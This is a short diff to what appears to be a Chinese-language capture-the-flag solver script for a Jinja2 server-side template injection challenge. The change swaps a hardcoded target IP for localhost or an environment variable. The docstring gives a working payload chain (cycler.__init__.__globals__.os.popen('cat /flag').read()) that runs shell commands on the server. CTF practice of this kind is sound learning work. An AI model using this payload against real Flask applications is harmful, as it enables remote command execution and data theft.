@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 """
 Q38 - 综合 · Jinja2 SSTI 一键拿 flag
-靶机: http://47.120.76.57:34964/greet?name=<payload>
+靶机: http://127.0.0.1:34964/greet?name=<payload>
 原理: Flask render_template_string 把用户输入拼进模板源码 -> Jinja2 表达式被服务端执行
 利用链: cycler.__init__.__globals__.os.popen('cat /flag').read()
 """
@@ -12,7 +13,7 @@ import sys
 import urllib.parse
 import urllib.request
 
-BASE = "http://47.120.76.57:34964"
+BASE = os.environ.get("GKD_URL") or ("http://127.0.0.1:34964")
 
 
 def send(payload: str) -> str:
